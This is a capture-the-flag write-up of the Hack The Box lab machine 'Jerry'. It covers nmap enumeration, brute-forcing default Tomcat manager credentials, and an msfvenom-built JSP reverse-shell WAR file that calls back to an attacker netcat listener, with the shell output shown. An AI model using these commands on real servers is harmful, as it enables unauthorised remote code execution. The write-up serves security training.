---
machine: Jerry
platform: Hack The Box
category: Windows
difficulty: Easy
points: 20
tags: [tomcat, war-upload, default-creds, msfvenom, reverse-shell]
date: 2026-05-06
status: retired
summary: "An easy Windows box centered on a misconfigured Apache Tomcat server — exercising default-credential checks and abusing the web application manager's deployment feature for code execution. A quick lesson in why exposed management interfaces are dangerous."
---
## Enumeration

Nmap scan:
```bash
┌──(kali㉿kali)-[~/htb/jerry]
└─$ nmap -sC -sV 10.129.136.9 | tee nmapbasic              
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-06 15:31 -0400
Nmap scan report for 10.129.136.9
Host is up (0.0045s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.89 seconds
```

We find that for tomcat apache we want to access the Web Application Manager

We need to test a handful of default credentials first to authenticate or else we get a 403 manager when we attempt to navigate to /manager/html

We can do it manually with
`curl -u <user>:<pass> http://10.129.136.9:8080/manager/html`

or automate it with metasploit with:
`msfconsole` and  `use auxiliary/scanner/http/tomcat_mgr_login`

We find the credential to the WAM are `tomcat:s3cret`

## Foothold

Inside the Web Application Manager we see that we can upload WAR files

With some research we can find that WAR files are zip-like java based files that we could utilize for a reverse shell.

We generate a reverse shell WAR file with msfvenom:
```bash
┌──(kali㉿kali)-[~/htb/jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.144 LPORT=1337 -f war > reverse.war
Payload size: 1096 bytes
Final size of war file: 1096 bytes

                                                                                                                                                                         
┌──(kali㉿kali)-[~/htb/jerry]
└─$ strings reverse.war | grep jsp # in order to get the name of the file
wesaxyotssrk.jsp}Tak
wesaxyotssrk.jspPK
```

We run strings to find the filename that was generated as after we upload our `reverse.war` file to trigger it we will need to navigate to `<weburl>/reverse/<filename>.jsp` while our listener is up

```bash
──(kali㉿kali)-[~/htb/jerry]
└─$ nc -lvnp 1337                            
listening on [any] 1337 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.136.9] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>ls
ls

C:\apache-tomcat-7.0.88>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\apache-tomcat-7.0.88

06/19/2018  04:07 AM    <DIR>          .
06/19/2018  04:07 AM    <DIR>          ..
06/19/2018  04:06 AM    <DIR>          bin
06/19/2018  06:47 AM    <DIR>          conf
06/19/2018  04:06 AM    <DIR>          lib
05/07/2018  02:16 PM            57,896 LICENSE
05/07/2026  05:28 AM    <DIR>          logs
05/07/2018  02:16 PM             1,275 NOTICE
05/07/2018  02:16 PM             9,600 RELEASE-NOTES
05/07/2018  02:16 PM            17,454 RUNNING.txt
06/19/2018  04:06 AM    <DIR>          temp
05/07/2026  05:57 AM    <DIR>          webapps
06/19/2018  04:34 AM    <DIR>          work
               4 File(s)         86,225 bytes
               9 Dir(s)   2,420,576,256 bytes free
```

We successfully get our reverse shell and can navigate to Administrator's desktop and retrieve both of the flags.
